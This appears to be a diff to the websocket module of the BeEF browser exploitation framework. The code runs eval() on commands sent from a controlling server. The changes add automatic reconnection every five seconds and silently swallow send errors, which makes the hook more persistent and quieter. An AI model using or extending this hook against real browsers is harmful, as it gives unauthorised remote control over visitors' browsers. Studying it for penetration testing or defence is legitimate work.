@@ -58,11 +58,21 @@ beef.websocket = {
             eval(message.data);
         }
 
+        this.socket.onclose = function () {
+        setTimeout(function(){beef.websocket.start()}, 5000);
+        }
+
     },
 
     send:function (data) {
+        try {
         this.socket.send(data);
-//        console.log("Sent [" + data + "]");
+        //console.log("Sent [" + data + "]");
+         }
+         catch(err){
+         //console.log(err);
+
+         }
     },
 
     alive: function (){
